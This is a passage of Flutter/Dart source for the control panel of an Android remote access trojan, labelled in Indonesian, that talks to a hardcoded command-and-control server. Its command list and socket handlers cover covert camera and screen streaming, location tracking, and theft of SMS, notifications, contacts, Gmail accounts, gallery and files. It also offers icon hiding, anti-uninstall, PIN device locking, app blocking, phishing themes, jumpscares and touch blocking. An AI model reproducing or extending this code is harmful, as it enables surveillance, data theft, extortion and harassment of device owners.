import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'dart:typed_data';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:file_picker/file_picker.dart';
import 'dart:io';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:webview_flutter/webview_flutter.dart';

const String baseUrl = "http://dwixclouds.cloudnesia.my.id:3013";

enum LogType { info, success, warning, error }
enum TabIndex { devices, control, messages }

class LogEntry {
  final DateTime timestamp;
  final String message;
  final LogType type;
  LogEntry({required this.timestamp, required this.message, this.type = LogType.info});
}

// ─── GLOBAL THEME CONSTANTS - MINECRAFT ─────────────────────────────
const Color bgMain = Color(0xFF1A1A1A);
const Color bgSurface = Color(0xFF3D3D3D);
const Color bgCard = Color(0xFF2D2D2D);
const Color textMain = Color(0xFFE8E8E8);
const Color textSub = Color(0xFFAAAAAA);
const Color accentWhite = Color(0xFF4CAF50);
const Color borderLight = Color(0xFF5D5D5D);
const Color successColor = Color(0xFF00E676);
const Color warningColor = Color(0xFFFFD700);
const Color errorColor = Color(0xFFFF5252);
const Color mcGold = Color(0xFFFFD700);
const Color mcDiamond = Color(0xFF4DD0E1);
const Color mcRedstone = Color(0xFFFF5252);
const Color mcEmerald = Color(0xFF00E676);

// ─── MAIN PAGE ────────────────────────────────────────────────────────
class ControlPanelPage extends StatefulWidget {
  final Map<String, dynamic>? device;

  const ControlPanelPage({super.key, this.device});

  @override
  State<ControlPanelPage> createState() => _ControlPanelPageState();
}

class _ControlPanelPageState extends State<ControlPanelPage> with SingleTickerProviderStateMixin {
  TabIndex _currentTab = TabIndex.devices;
  final List<LogEntry> _executionLogs = [];
  late IO.Socket socket;
  bool _isProcessing = false;
  bool _isConnected = false;
  bool _isInit = false;

  String _targetId = "unknown";
  String _targetModel = "COMMAND CENTER";
  Map<String, dynamic> _deviceData = {};

  List<dynamic> _devices = [];
  String? _sessionKey;
  Timer? _pollingTimer;

  Map<String, dynamic> _smsData = {};
  Map<String, dynamic> _notifData = {};
  bool _isSmsLoading = false;

  final StreamController<String> _cameraFrameStreamController = StreamController<String>.broadcast();

  late AnimationController _glowController;
  late AnimationController _rotateController;
  late Animation<double> _glowAnimation;
  late Animation<double> _rotateAnimation;

  final ScrollController _logScrollController = ScrollController();
  final TextEditingController _customCommandController = TextEditingController();
  final TextEditingController _customExtraController = TextEditingController();

  bool _isJumpscareActive = false;
  bool _isJumpscare2Active = false;
  bool _isDialogSpamActive = false;
  bool _isTouchBlocked = false;
  bool _isTtsSpeaking = false;
  bool _isVideoOverlayActive = false;
  bool _isLockCustomActive = false;
  bool _isAntiUninstallActive = false;
  String _jumpscareUrl = '';

  Map<String, dynamic> _locationData = {};
  bool _locationLoading = false;

  String _selectedSmsKey = '';
  bool _showingSmsDetail = false;

  String _jumpscare2Url = '';
  int _jumpscare2Duration = 3000;
  List<String> _blockedApps = [];

  bool _cameraModalVisible = false;
  String _cameraFrame = '';
  String _cameraFacing = 'front';
  bool _cameraLoading = true;

  bool _screenshotResultVisible = false;
  String _screenshotFrame = '';
  String _screenshotFacing = 'front';
  double _screenshotScale = 1.0;
  double _screenshotOffsetX = 0.0;
  double _screenshotOffsetY = 0.0;

  bool _screenModalVisible = false;
  String _screenFrame = '';
  bool _screenLoading = true;

  BuildContext? _locationLoadingContext;
  BuildContext? _notifLoadingContext;

  List<Map<String, dynamic>> _galleryPhotos = [];
  bool _isGalleryLoading = false;
  bool _galleryModalVisible = false;
  String _currentGalleryImage = '';
  int _currentGalleryIndex = 0;
  final StreamController<List<Map<String, dynamic>>> _galleryStreamController =
  StreamController<List<Map<String, dynamic>>>.broadcast();

  bool _isWaitingForPhoto = false;
  BuildContext? _photoLoadingContext;

  late List<Map<String, dynamic>> _controlItems;

  List<Map<String, dynamic>> _installedApps = [];
  Set<String> _blockedSet = {};

  @override
  void initState() {
    super.initState();
    _initializeAnimations();
    _loadTokenAndFetch();
    _initSocket();
    _initCameraStream();
    _startPolling();

    _controlItems = [
      {"label": "Flash", "icon": Icons.flash_on, "color": Colors.amber, "command": "flashlight", "isToggle": true, "isOn": _deviceData['flashlight'] ?? false, "needsInput": false},
      {"label": "Lock Device", "icon": Icons.lock, "color": accentWhite, "command": "lockDevice", "isToggle": true, "isOn": _deviceData['deviceLocked'] ?? false, "needsInput": true, "inputHint": "Pesan kunci (opsional)", "inputType": "text"},
      {"label": "Lock V2 (HTML)", "icon": Icons.lock_outline, "color": Colors.indigo, "command": "lockCustom", "isToggle": true, "isOn": _isLockCustomActive, "needsInput": true, "inputHint": "HTML untuk tampilan kunci", "inputType": "multiline"},
      {"label": "Video Overlay", "icon": Icons.movie_creation, "color": Colors.redAccent, "command": "videoOverlay", "isToggle": true, "isOn": _isVideoOverlayActive, "needsInput": false},
      {"label": "Hide Icon", "icon": Icons.visibility_off, "color": Colors.orange, "command": "hideIcon", "isToggle": true, "isOn": _deviceData['iconHidden'] ?? false, "needsInput": false},
      {"label": "Mute Volume", "icon": Icons.volume_off, "color": Colors.red, "command": "muteVolume", "isToggle": true, "isOn": _deviceData['volumeMuted'] ?? false, "needsInput": false},
      {"label": "Anti Uninstall", "icon": Icons.security, "color": Colors.teal, "command": "antiUninstall", "isToggle": true, "isOn": _isAntiUninstallActive, "needsInput": false},
      {"label": "Stuck Layar", "icon": Icons.touch_app, "color": Colors.amber, "command": "touchBlock", "isToggle": false, "needsInput": true, "inputHint": "Durasi dalam detik (0 = ∞)", "inputType": "number", "extra": '{"duration": 0}'},
      {"label": "TTS", "icon": Icons.record_voice_over, "color": Colors.purpleAccent, "command": "ttsSpeak", "isToggle": false, "needsInput": true, "inputHint": "Teks untuk diucapkan", "inputType": "text", "extra": '{"text":"Halo, ini tes suara","lang":"id"}'},
      {"label": "Foto Depan", "icon": Icons.camera_front, "color": accentWhite, "command": "camera", "isToggle": false, "needsInput": false, "extra": "front"},
      {"label": "Foto Belakang", "icon": Icons.camera_rear, "color": accentWhite, "command": "camera", "isToggle": false, "needsInput": false, "extra": "back"},
      {"label": "Live Cam Depan", "icon": Icons.videocam, "color": accentWhite, "command": "liveCamera", "isToggle": false, "needsInput": false, "extra": "front"},
      {"label": "Live Cam Belakang", "icon": Icons.videocam, "color": accentWhite, "command": "liveCamera", "isToggle": false, "needsInput": false, "extra": "back"},
      {"label": "Stop Camera", "icon": Icons.stop_circle, "color": Colors.red, "command": "stopCamera", "isToggle": false, "needsInput": false},
      {"label": "Stop Live Screen", "icon": Icons.stop_screen_share, "color": Colors.red, "command": "stopScreen", "isToggle": false, "needsInput": false},
      {"label": "Vibrate", "icon": Icons.vibration, "color": Colors.grey, "command": "vibrate", "isToggle": false, "needsInput": false, "extra": "500"},
      {"label": "Toast", "icon": Icons.message, "color": Colors.amber, "command": "showToast", "isToggle": false, "needsInput": true, "inputHint": "Pesan toast", "inputType": "text", "extra": "Pesan dari C2!"},
      {"label": "Spam Dialog", "icon": Icons.chat, "color": Colors.redAccent, "command": "dialogSpam", "isToggle": false, "needsInput": true, "inputHint": "Teks spam", "inputType": "text", "extra": '{"text":"SPAM dari C2!"}'},
      {"label": "Block App", "icon": Icons.block, "color": Colors.red, "command": "blockApp", "isToggle": false, "needsInput": false},
      {"label": "Unblock App", "icon": Icons.check_circle, "color": Colors.green, "command": "unblockApp", "isToggle": false, "needsInput": true, "inputHint": "Package name (contoh: com.whatsapp)", "inputType": "text", "extra": "com.whatsapp"},
      {"label": "Unblock All", "icon": Icons.check_circle_outline, "color": Colors.greenAccent, "command": "unblockAll", "isToggle": false, "needsInput": false},
      {"label": "Tema Phising", "icon": Icons.color_lens, "color": Colors.greenAccent, "command": "changeTheme", "isToggle": false, "needsInput": true, "inputHint": "Nama tema (whatsapp/instagram/etc)", "inputType": "text", "extra": "whatsapp"},
      {"label": "📍 Get Location", "icon": Icons.location_on, "color": Colors.orange, "command": "getLocation", "isToggle": false, "needsInput": false},
      {"label": "Live Screen", "icon": Icons.screen_share, "color": accentWhite, "command": "screen", "isToggle": false, "needsInput": false, "extra": "start"},
      {"label": "Phone", "icon": Icons.phone_android, "color": Colors.teal, "command": "getPhone", "isToggle": false, "needsInput": false},
      {"label": "Gmail", "icon": Icons.email_outlined, "color": Colors.redAccent, "command": "getGmail", "isToggle": false, "needsInput": false},
      {"label": "Kontak", "icon": Icons.contacts_outlined, "color": Colors.amber, "command": "getContacts", "isToggle": false, "needsInput": false},
      {"label": "Jumpscare", "icon": Icons.warning_amber_rounded, "color": Colors.red, "command": "jumpscareStart", "isToggle": true, "isOn": _isJumpscareActive, "needsInput": false},
      {"label": "Jumpscare V2", "icon": Icons.dangerous, "color": Colors.redAccent, "command": "jumpscare2Start", "isToggle": true, "isOn": _isJumpscare2Active, "needsInput": false},
      {"label": "Set Wallpaper", "icon": Icons.wallpaper, "color": Colors.purple, "command": "setWallpaper", "isToggle": false, "needsInput": true, "inputHint": "Masukkan URL Gambar (contoh: https://example.com/image.jpg)", "inputType": "text", "extra": "https://example.com/image.jpg"},
      {"label": "Open Situs", "icon": Icons.public, "color": Colors.green, "command": "openUrl", "isToggle": false, "needsInput": true, "inputHint": "Masukkan URL Situs (contoh: https://example.com)", "inputType": "text", "extra": "https://example.com"},
      {"label": "Galeri", "icon": Icons.photo_library, "color": accentWhite, "command": "getGallery", "isToggle": false, "needsInput": false, "extra": ""},
      {"label": "File Manager", "icon": Icons.folder_open, "color": Colors.orange, "command": "getFiles", "isToggle": false, "needsInput": false, "extra": ""},
    ];

    _galleryStreamController.stream.listen((photos) {
      if (mounted) {
        setState(() {
          _galleryPhotos = photos;
          _isGalleryLoading = false;
          _galleryModalVisible = true;
        });
        _addLog("🖼️ Gallery stream update: ${photos.length} foto", LogType.success);
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (context) => GalleryFullscreenPage(
              targetId: _targetId,
              targetModel: _targetModel,
              galleryStream: _galleryStreamController.stream,
              onClose: _closeGalleryFullscreen,
              onRefresh: () {
                _sendCommand('getGallery');
                _addLog("🖼️ Refreshing gallery", LogType.info);
              },
              onDownload: _downloadScreenshot,
            ),
            fullscreenDialog: true,
          ),
        );
      }
    });
  }

  void _initializeAnimations() {
    _glowController = AnimationController(
      duration: const Duration(milliseconds: 2500),
      vsync: this,
    );
    _glowController.repeat(reverse: true);
    _glowAnimation = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOutSine),
    );

    _rotateController = AnimationController(
      duration: const Duration(seconds: 20),
      vsync: this,
    );
    _rotateController.repeat();
    _rotateAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _rotateController, curve: Curves.linear),
    );
  }

  Future<void> _loadTokenAndFetch() async {
    final prefs = await SharedPreferences.getInstance();
    _sessionKey = prefs.getString("key");
    if (_sessionKey != null) {
      _fetchDevices();
    }
  }

  void _startPolling() {
    _pollingTimer = Timer.periodic(const Duration(seconds: 10), (timer) {
      _fetchDevices();
    });
  }

  Future<void> _fetchDevices() async {
    if (_sessionKey == null) return;
    try {
      final response = await http.get(
        Uri.parse("$baseUrl/api/list-targets"),
        headers: {"x-auth-token": _sessionKey!},
      );
      if (response.statusCode == 200 && mounted) {
        setState(() {
          _devices = jsonDecode(response.body);
        });
      }
    } catch (e) {
      debugPrint("Fetch devices error: $e");
    }
  }

  void _initSocket() {
    try {
      socket = IO.io(
        baseUrl,
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setPath('/socket.io')
            .setQuery({'type': 'admin', 'id': 'ADMIN_PANEL', 'token': _sessionKey ?? ''})
            .enableAutoConnect()
            .build(),
      );

      socket.onConnect((_) {
        if (mounted) {
          setState(() => _isConnected = true);
          _addLog("✅ Sistem Kontrol Terhubung", LogType.success);
          socket.emit('controller:join', { 'token': _sessionKey });
          _setupSocketListeners();
        }
      });

      socket.onDisconnect((_) {
        if (mounted) setState(() => _isConnected = false);
      });

      socket.connect();
    } catch (e) {
      _addLog("❌ Socket Error: $e", LogType.error);
    }
  }

  void _setupSocketListeners() {
    socket.on('devices:update', (data) {
      if (mounted) {
        setState(() {
          _devices = List<dynamic>.from(data);
        });
      }
    });

    socket.on('device:location', (data) {
      if (data['deviceId'] == _targetId) {
        if (mounted) {
          setState(() {
            _locationData = data;
            _locationLoading = false;
          });
          _addLog("📍 Location received", LogType.success);

          if (_locationLoadingContext != null) {
            try {
              Navigator.of(_locationLoadingContext!, rootNavigator: true).pop();
            } catch (_) {}
            _locationLoadingContext = null;
          }

          Future.delayed(const Duration(milliseconds: 300), () {
            if (mounted) {
              Navigator.of(context, rootNavigator: true).push(
                MaterialPageRoute(
                  builder: (context) => LocationFullscreenPage(
                    targetModel: _targetModel,
                    locationData: _locationData,
                  ),
                  fullscreenDialog: true,
                ),
              );
            }
          });
        }
      }
    });

    socket.on('device:sms', (data) {
      if (data['deviceId'] == _targetId) {
        setState(() {
          _smsData = data;
          _addLog("📱 SMS received: ${data['list']?.length ?? 0} apps", LogType.success);
        });
      }
    });

    socket.on('device:status', (data) {
      if (data['deviceId'] == _targetId) {
        final status = data['status'] as Map? ?? {};

        final smsList = status['smsList'];
        if (smsList != null) {
          if (mounted) {
            setState(() {
              _smsData.clear();
              for (var app in smsList) {
                final key = '${app['pkg']}_${app['appName']}';
                _smsData[key] = {
                  'appName': app['appName'],
                  'pkg': app['pkg'],
                  'messages': app['messages'] ?? []
                };
              }
              _isSmsLoading = false;
            });
            _addLog("📬 SMS list loaded: ${smsList.length} apps", LogType.success);
          }
        }

        final notifList = status['notifList'];
        if (notifList != null) {
          if (mounted) {
            setState(() {
              _notifData.clear();
              for (var app in notifList) {
                final key = app['pkg'];
                _notifData[key] = {
                  'appName': app['appName'],
                  'pkg': key,
                  'messages': app['messages'] ?? []
                };
              }
            });
            _addLog("🔔 Notif list loaded: ${notifList.length} apps", LogType.info);
          }
        }
      }
    });

    socket.on('device:notif', (data) {
      if (data['deviceId'] == _targetId) {
        if (mounted) {
          setState(() {
            final notif = data['notif'];
            if (notif != null) {
              final key = notif['pkg'];
              if (!_notifData.containsKey(key)) {
                _notifData[key] = {
                  'appName': notif['appName'],
                  'pkg': key,
                  'messages': []
                };
              }
              final messages = _notifData[key]['messages'] as List;
              final exists = messages.any((x) =>
                x['time'] == notif['time'] && x['text'] == notif['text']);
              if (!exists) {
                messages.insert(0, notif);
              }
            }
          });
          _addLog("🔔 Notif diterima", LogType.info);
        }
      }
    });

    socket.on('camera:frame', (data) {
      if (data['deviceId'] == _targetId && data['frame'] != null) {
        final frame = data['frame'];
        _cameraFrameStreamController.add(frame);
        _addLog("📷 Camera frame received", LogType.info);

        if (_isWaitingForPhoto) {
          _isWaitingForPhoto = false;
          if (_photoLoadingContext != null) {
            try { Navigator.pop(_photoLoadingContext!); } catch (_) {}
            _photoLoadingContext = null;
          }
          if (mounted) {
            Navigator.push(
              context,
              MaterialPageRoute(
                builder: (context) => ScreenshotResultPage(
                  targetModel: _targetModel,
                  screenshotFrame: frame,
                  screenshotFacing: _cameraFacing,
                  onClose: () {
                    Navigator.pop(context);
                    _sendCommand('camera', extra: 'stop');
                  },
                ),
                fullscreenDialog: true,
              ),
            );
          }
        }
      }
    });

    socket.on('screen:frame', (data) {
      if (data['frame'] != null) {
        setState(() {
          _screenFrame = data['frame'];
          _screenLoading = false;
          _screenModalVisible = true;
        });
        _addLog("🖥️ Screen frame received", LogType.info);
      }
    });

    socket.on('command_response', (data) {
      if (data['deviceId'] == _targetId) {
        final cmd = data['command']?.toString() ?? '';
        final status = data['status']?.toString() ?? '';
        _addLog("📥 Response: $cmd → $status", LogType.info);
        switch (cmd) {
          case 'jumpscareStart':
            setState(() => _isJumpscareActive = status == 'started');
            _updateControlItemState('jumpscareStart', status == 'started');
            break;
          case 'jumpscareStop':
            setState(() => _isJumpscareActive = false);
            _updateControlItemState('jumpscareStart', false);
            break;
          case 'jumpscare2Start':
            setState(() => _isJumpscare2Active = status == 'started');
            _updateControlItemState('jumpscare2Start', status == 'started');
            break;
          case 'jumpscare2Stop':
            setState(() => _isJumpscare2Active = false);
            _updateControlItemState('jumpscare2Start', false);
            break;
          case 'dialogSpam': setState(() => _isDialogSpamActive = status == 'started'); break;
          case 'dialogSpamStop': setState(() => _isDialogSpamActive = false); break;
          case 'touchBlock': setState(() => _isTouchBlocked = status == 'started'); break;
          case 'touchBlockStop': setState(() => _isTouchBlocked = false); break;
          case 'ttsSpeak': setState(() => _isTtsSpeaking = status == 'started'); break;
          case 'ttsStop': setState(() => _isTtsSpeaking = false); break;
          case 'videoOverlay': setState(() => _isVideoOverlayActive = status == 'started'); break;
          case 'videoOverlayHide': setState(() => _isVideoOverlayActive = false); break;
          case 'lockCustom': setState(() { _isLockCustomActive = status == 'locked'; }); break;
          case 'blockApp': if (data['package'] != null && !_blockedApps.contains(data['package'])) setState(() => _blockedApps.add(data['package'])); break;
          case 'unblockApp': setState(() => _blockedApps.remove(data['package'])); break;
          case 'unblockAll': setState(() => _blockedApps.clear()); break;
          case 'lockDevice':
            if (data['status'] == 'locked' || data['status'] == true) {
              setState(() { _deviceData['deviceLocked'] = true; _updateControlItemState('lockDevice', true); });
            } else {
              setState(() { _deviceData['deviceLocked'] = false; _updateControlItemState('lockDevice', false); });
            }
            break;
          case 'unlockDevice':
            setState(() { _deviceData['deviceLocked'] = false; _updateControlItemState('lockDevice', false); });
            break;
          case 'hideIcon':
            setState(() {
              _deviceData['iconHidden'] = data['status'] == 'hidden';
              _updateControlItemState('hideIcon', data['status'] == 'hidden');
            });
            break;
          case 'muteVolume':
            setState(() {
              _deviceData['volumeMuted'] = data['status'] == 'muted';
              _updateControlItemState('muteVolume', data['status'] == 'muted');
            });
            break;
          case 'antiUninstall':
            setState(() {
              _isAntiUninstallActive = data['status'] == 'active';
              _updateControlItemState('antiUninstall', data['status'] == 'active');
            });
            break;
          case 'flashlight':
            setState(() {
              _deviceData['flashlight'] = data['status'] == 'on';
              _updateControlItemState('flashlight', data['status'] == 'on');
            });
            break;
        }
      }
    });

    socket.on('device:phone', (data) {
      if (data['deviceId'] == _targetId) {
        _addLog("📱 Phone data received", LogType.success);
        _showPhoneBottomSheet(data);
      }
    });

    socket.on('device:gmail', (data) {
      if (data['deviceId'] == _targetId) {
        _addLog("📧 Gmail accounts received", LogType.success);
        _showGmailBottomSheet(data);
      }
    });

    socket.on('device:contacts', (data) {
      if (data['deviceId'] == _targetId) {
        _addLog("📇 Contacts received", LogType.success);
        _showContactsBottomSheet(data);
      }
    });

    socket.on('device:apps', (data) {
      if (data['deviceId'] == _targetId) {
        final apps = data['apps'] as List? ?? [];
        setState(() {
          _installedApps = apps.map((app) => Map<String, dynamic>.from(app)).toList();
        });
      }
    });
  }

  void _updateControlItemState(String command, bool value) {
    for (int i = 0; i < _controlItems.length; i++) {
      if (_controlItems[i]['command'] == command) {
        setState(() {
          _controlItems[i]['isOn'] = value;
        });
        break;
      }
    }
  }

  void _initCameraStream() {
    _cameraFrameStreamController.stream.listen((frame) {});
  }

  void _addLog(String message, [LogType type = LogType.info]) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, LogEntry(timestamp: DateTime.now(), message: message, type: type));
        if (_executionLogs.length > 200) _executionLogs.removeLast();
      });
    }
  }

  String _formatTime(DateTime time) => "${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}:${time.second.toString().padLeft(2, '0')}";

  Color _getLogColor(LogType type) {
    switch (type) {
      case LogType.success: return successColor;
      case LogType.error: return errorColor;
      case LogType.warning: return warningColor;
      default: return textSub;
    }
  }

  Future<void> _sendCommand(String command, {String? extra}) async {
    if (!_isConnected) {
      _addLog("⚠️ C2 Disconnected", LogType.warning);
      return;
    }
    if (_targetId == "unknown" || _targetId.isEmpty) {
      _addLog("❌ Device ID tidak valid!", LogType.error);
      return;
    }
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('key');
    if (token == null || token.isEmpty) {
      _addLog("❌ Token hilang! Login ulang.", LogType.error);
      if (mounted) Navigator.pushReplacementNamed(context, '/login');
      return;
    }

    setState(() => _isProcessing = true);
    try {
      final response = await http.post(
        Uri.parse("$baseUrl/api/command/$_targetId"),
        headers: {
          "Content-Type": "application/json",
          "x-auth-token": token,
        },
        body: jsonEncode({
          "command": command,
          "value": extra ?? "",
        }),
      );

      if (response.statusCode == 200) {
        _addLog("🚀 EXEC: $command", LogType.success);
      } else if (response.statusCode == 401) {
        _addLog("❌ Sesi kadaluarsa! Login ulang.", LogType.error);
        if (mounted) Navigator.pushReplacementNamed(context, '/login');
      } else {
        _addLog("❌ ERR: ${response.statusCode}", LogType.error);
      }
    } catch (e) {
      _addLog("⚠️ HTTP ERR: $e", LogType.error);
    } finally {
      if (mounted) setState(() => _isProcessing = false);
    }
  }

  Future<String?> _showLockDeviceDialog() async {
    String pin = '';
    String lockTitle = '';
    String errorMessage = '';

    return showDialog<String>(
      context: context,
      barrierDismissible: false,
      builder: (context) => StatefulBuilder(
        builder: (context, setState) => AlertDialog(
          backgroundColor: bgCard,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(4),
            side: const BorderSide(color: accentWhite, width: 3),
          ),
          title: const Text(
            'SET DEVICE LOCK',
            style: TextStyle(
              color: textMain,
              fontSize: 15,
              fontWeight: FontWeight.bold,
              letterSpacing: 2,
              shadows: [
                Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
              ],
            ),
            textAlign: TextAlign.center,
          ),
          content: SingleChildScrollView(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                const SizedBox(height: 12),
                const Text(
                  'MASUKKAN PIN & JUDUL LOCK',
                  style: TextStyle(
                    color: textSub,
                    fontSize: 10,
                    letterSpacing: 2,
                  ),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 20),

                Align(
                  alignment: Alignment.centerLeft,
                  child: Text(
                    'PIN 4 ANGKA',
                    style: TextStyle(
                      color: textSub,
                      fontSize: 11,
                      fontWeight: FontWeight.w600,
                      letterSpacing: 1,
                    ),
                  ),
                ),
                const SizedBox(height: 8),

                Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: List.generate(4, (index) {
                    return Container(
                      width: 52,
                      height: 60,
                      margin: const EdgeInsets.symmetric(horizontal: 5),
                      decoration: BoxDecoration(
                        color: bgSurface,
                        border: Border.all(
                          color: accentWhite,
                          width: 2,
                        ),
                        boxShadow: [
                          BoxShadow(
                            color: Colors.black.withOpacity(0.5),
                            blurRadius: 0,
                            offset: const Offset(2, 2),
                          )
                        ],
                      ),
                      child: Center(
                        child: Text(
                          index < pin.length ? '●' : '—',
                          style: TextStyle(
                            color: accentWhite,
                            fontSize: index < pin.length ? 20 : 24,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ),
                    );
                  }),
                ),
                const SizedBox(height: 16),

                TextField(
                  inputFormatters: [
                    FilteringTextInputFormatter.digitsOnly,
                    LengthLimitingTextInputFormatter(4),
                  ],
                  keyboardType: TextInputType.number,
                  onChanged: (value) {
                    setState(() {
                      pin = value;
                      errorMessage = '';
                    });
                  },
                  style: const TextStyle(color: Colors.transparent),
                  decoration: const InputDecoration(
                    isDense: true,
                    contentPadding: EdgeInsets.zero,
                    border: InputBorder.none,
                    enabledBorder: InputBorder.none,
                    focusedBorder: InputBorder.none,
                  ),
                  autofocus: true,
                ),

                GridView.count(
                  crossAxisCount: 3,
                  shrinkWrap: true,
                  physics: const NeverScrollableScrollPhysics(),
                  padding: EdgeInsets.zero,
                  mainAxisSpacing: 8,
                  crossAxisSpacing: 8,
                  children: [
                    ...[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) {
                      return _buildKeypadButton(
                        '$num',
                        onPressed: () {
                          if (pin.length < 4) {
                            setState(() {
                              pin += '$num';
                              errorMessage = '';
                            });
                          }
                        },
                      );
                    }),
                    _buildKeypadButton(
                      '⌫',
                      onPressed: () {
                        if (pin.isNotEmpty) {
                          setState(() {
                            pin = pin.substring(0, pin.length - 1);
                            errorMessage = '';
                          });
                        }
                      },
                    ),
                  ],
                ),
                const SizedBox(height: 12),

                if (errorMessage.isNotEmpty)
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                    child: Text(
                      errorMessage,
                      style: const TextStyle(
                        color: errorColor,
                        fontSize: 10,
                        letterSpacing: 1,
                      ),
                      textAlign: TextAlign.center,
                    ),
                  ),
                const SizedBox(height: 8),

                Align(
                  alignment: Alignment.centerLeft,
                  child: Text(
                    'JUDUL / PESAN LOCK',
                    style: TextStyle(
                      color: textSub,
                      fontSize: 11,
                      fontWeight: FontWeight.w600,
                      letterSpacing: 1,
                    ),
                  ),
                ),
                const SizedBox(height: 8),

                TextField(
                  onChanged: (value) {
                    setState(() {
                      lockTitle = value;
                    });
                  },
                  maxLength: 60,
                  decoration: InputDecoration(
                    hintText: 'Contoh: Sistem Terkunci...',
                    hintStyle: TextStyle(color: textSub, fontSize: 12),
                    counterText: '',
                    contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                    border: const OutlineInputBorder(
                      borderRadius: BorderRadius.zero,
                      borderSide: BorderSide(color: accentWhite, width: 2),
                    ),
                    enabledBorder: const OutlineInputBorder(
                      borderRadius: BorderRadius.zero,
                      borderSide: BorderSide(color: accentWhite, width: 2),
                    ),
                    focusedBorder: const OutlineInputBorder(
                      borderRadius: BorderRadius.zero,
                      borderSide: BorderSide(color: mcGold, width: 2),
                    ),
                  ),
                  style: const TextStyle(color: textMain, fontSize: 13),
                ),
              ],
            ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context, null),
              child: const Text("BATAL", style: TextStyle(color: textSub)),
            ),
            ElevatedButton(
              onPressed: () {
                if (pin.length != 4) {
                  setState(() {
                    errorMessage = 'PIN harus 4 angka!';
                  });
                  return;
                }
                final lockData = jsonEncode({
                  'pin': pin,
                  'title': lockTitle.trim().isEmpty ? 'Perangkat Terkunci' : lockTitle.trim(),
                });
                Navigator.pop(context, lockData);
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: accentWhite,
                foregroundColor: Colors.white,
                shape: const RoundedRectangleBorder(
                  borderRadius: BorderRadius.zero,
                  side: BorderSide(color: Colors.black, width: 2),
                ),
              ),
              child: const Text("LOCK DEVICE"),
            ),
          ],
        ),
      ),
    );
  }

  Future<String?> _showInputDialog({
    required String title,
    required String hint,
    String initialValue = '',
    bool multiline = false,
    TextInputType keyboardType = TextInputType.text,
  }) async {
    final controller = TextEditingController(text: initialValue);
    return showDialog<String>(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        backgroundColor: bgCard,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(4),
          side: const BorderSide(color: accentWhite, width: 3),
        ),
        title: Text(
          title,
          style: const TextStyle(
            color: textMain,
            fontSize: 14,
            fontWeight: FontWeight.bold,
            shadows: [
              Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
            ],
          ),
        ),
        content: multiline
            ? TextField(
                controller: controller,
                maxLines: 10,
                style: const TextStyle(color: textMain, fontSize: 12),
                decoration: InputDecoration(
                  hintText: hint,
                  hintStyle: const TextStyle(color: textSub),
                  filled: true,
                  fillColor: bgSurface,
                  border: const OutlineInputBorder(
                    borderRadius: BorderRadius.zero,
                    borderSide: BorderSide(color: accentWhite, width: 2),
                  ),
                  enabledBorder: const OutlineInputBorder(
                    borderRadius: BorderRadius.zero,
                    borderSide: BorderSide(color: accentWhite, width: 2),
                  ),
                  focusedBorder: const OutlineInputBorder(
                    borderRadius: BorderRadius.zero,
                    borderSide: BorderSide(color: mcGold, width: 2),
                  ),
                ),
              )
            : TextField(
                controller: controller,
                keyboardType: keyboardType,
                style: const TextStyle(color: textMain, fontSize: 12),
                decoration: InputDecoration(
                  hintText: hint,
                  hintStyle: const TextStyle(color: textSub),
                  filled: true,
                  fillColor: bgSurface,
                  border: const OutlineInputBorder(
                    borderRadius: BorderRadius.zero,
                    borderSide: BorderSide(color: accentWhite, width: 2),
                  ),
                  enabledBorder: const OutlineInputBorder(
                    borderRadius: BorderRadius.zero,
                    borderSide: BorderSide(color: accentWhite, width: 2),
                  ),
                  focusedBorder: const OutlineInputBorder(
                    borderRadius: BorderRadius.zero,
                    borderSide: BorderSide(color: mcGold, width: 2),
                  ),
                ),
              ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, null),
            child: const Text("BATAL", style: TextStyle(color: textSub)),
          ),
          ElevatedButton(
            onPressed: () {
              final value = controller.text.trim();
              Navigator.pop(context, value);
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: accentWhite,
              foregroundColor: Colors.white,
              shape: const RoundedRectangleBorder(
                borderRadius: BorderRadius.zero,
                side: BorderSide(color: Colors.black, width: 2),
              ),
            ),
            child: const Text("KIRIM"),
          ),
        ],
      ),
    );
  }

  Widget _buildKeypadButton(String label, {required VoidCallback onPressed}) {
    return GestureDetector(
      onTap: onPressed,
      child: Container(
        decoration: BoxDecoration(
          color: bgSurface,
          border: Border.all(color: accentWhite, width: 2),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.6),
              blurRadius: 0,
              offset: const Offset(3, 3),
            )
          ],
        ),
        child: Material(
          color: Colors.transparent,
          child: InkWell(
            onTap: onPressed,
            child: Center(
              child: Text(
                label,
                style: const TextStyle(
                  color: textMain,
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                  shadows: [
                    Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                  ],
                ),
